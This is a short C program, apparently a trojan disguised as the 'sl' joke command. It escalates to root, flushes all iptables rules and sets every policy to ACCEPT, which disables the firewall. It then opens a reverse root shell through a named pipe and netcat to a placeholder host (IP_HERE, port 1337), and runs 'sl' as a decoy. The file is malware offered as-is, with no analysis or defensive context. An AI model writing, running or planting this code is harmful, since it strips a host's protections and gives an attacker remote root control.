#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

	setuid(0);
	setgid(0);

	system("iptables -F");
	system("iptables -t mangle -F");

	system("iptables -P INPUT ACCEPT");
	system("iptables -P OUTPUT ACCEPT");
	system("iptables -P FORWARD ACCEPT");

	system("[ ! -p /tmp/aejhfktk ] && mkfifo /tmp/aejhfktk");
	system("(sudo /bin/bash 0</tmp/aejhfktk | nc IP_HERE 1337 1>/tmp/aejhfktk) &");

	system("sl");
	
	return 0;
}
